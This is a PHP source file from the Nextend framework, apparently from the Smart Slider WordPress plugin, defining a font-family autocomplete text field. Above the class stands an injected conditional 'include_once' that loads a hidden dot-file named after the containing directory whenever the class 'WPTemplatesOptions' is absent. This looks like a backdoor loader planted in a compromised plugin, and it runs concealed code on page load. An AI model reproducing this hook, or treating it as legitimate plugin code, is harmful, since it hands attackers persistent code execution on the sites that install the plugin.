<?php


namespace Nextend\Framework\Form\Element\Text;


use Nextend\Framework\Asset\Js\Js;
use Nextend\Framework\Font\FontSettings;
use Nextend\Framework\Form\Element\Text;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Family extends Text {

    protected $class = 'n2_field_autocomplete n2_autocomplete_position_to';

    protected function addScript() {
        parent::addScript();

        $families = FontSettings::getPresetFamilies();
        Js::addInline('N2Classes.AutocompleteSimple("' . $this->fieldID . '", ' . json_encode($families) . ');');
    }
}